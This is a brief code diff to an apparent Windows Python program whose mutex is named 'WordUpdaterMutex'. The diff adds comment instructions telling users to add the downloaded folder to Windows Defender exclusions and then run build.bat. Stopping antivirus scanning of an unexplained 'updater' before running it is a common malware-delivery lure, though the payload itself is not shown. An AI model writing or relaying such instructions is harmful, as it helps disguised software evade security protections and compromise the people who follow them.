@@ -9,6 +9,11 @@ import win32api
 import winerror
 import threading
 
+# +++++++++++++++ IMPORTANT +++++++++++++++++++++++++++=
+# Download the file in zip format
+# Then extract it and add rename the folder to anything
+# in windows search bar -> defender -> virus threat protection -> Virus and thread protection settings (manage settings) -> Exclusions (add the extracted folder ) -> then ./build.bat
+
 # === Prevent multiple instances using a named mutex ===
 mutex = win32event.CreateMutex(None, False, "Global\\WordUpdaterMutex")
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
